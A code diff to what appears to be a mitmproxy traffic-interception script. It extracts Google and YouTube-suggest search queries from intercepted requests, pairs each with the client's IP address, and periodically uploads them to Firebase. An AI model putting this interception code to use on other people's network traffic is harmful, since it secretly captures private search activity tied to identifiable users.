@@ -5,7 +5,7 @@ import re, json, sys, threading, time, signal, os
 sys.path.append('../')
 from connect import sendDataToFire
 
-
+# A common dictionary for storing data on firebase
 data = {
     "google" : [],
     "youtube" : [],
@@ -15,24 +15,22 @@ data = {
 
 def request (flow: http.HTTPFlow) -> None:
     global data
-    
-    #data["client"] = flow.client_conn.address[0]
-
-
-
-    if flow.request.host in ["www.google.co.in", "www.google.com", "adservice.google.co.in", "cdn.ampproject.org"]:
+    if flow.request.pretty_host in ["www.google.co.in", "www.google.com", "www.google.co.uk"]:
         if flow.request.url[:32] == "https://www.google.co.in/search?" and flow.request.method == 'GET' :
             s = flow.request.path
-            s = s[s.find('q=')+2:]
-            s = s[:s.find('&')]
-            #data["google"].append(s.replace('+', ' '))
-            ip = flow.client_conn.address[0]
-            data["google"].append((ip, s.replace('+', ' ')))
+            print("s",s)
+            s = s[ ((s.find('q='))+2) :]   # find and trim the query from url
+            s = s[:(s.find('&'))]
+            print("ss", s)
+            ip = flow.client_conn.address[0]    # get the ip address for the query
+            data["google"].append((ip, s.replace('+', ' ')))    # append the (ip, query) to list
+            print(data["google"])
     elif (flow.request.url[:50] == "https://suggestqueries.google.com/complete/search?" and flow.request.method == 'GET'):
+        ip = flow.client_conn.address[0]    # get the ip address for the query
         ys = flow.request.path
-        ys = ys[ys.find('q=')+2:]
-        ys = ys[:ys.find('&')]
-        data["youtube"].append(ys.replace('+', ' '))
+        ys = ys[(ys.find('q=')+2):]
+        ys = ys[:(ys.find('&'))]
+        data["youtube"].append((ip, ys.replace('+', ' ')))
     else:
         #data["web"].append(flow.request.host)
         pass
@@ -69,7 +67,6 @@ def send_to_fire():
                 sendDataToFire("Web", data["web"])
                 clear_data(data, "Web")
             time.sleep(20)
-            pass
         except:
             raise Exception
     pass
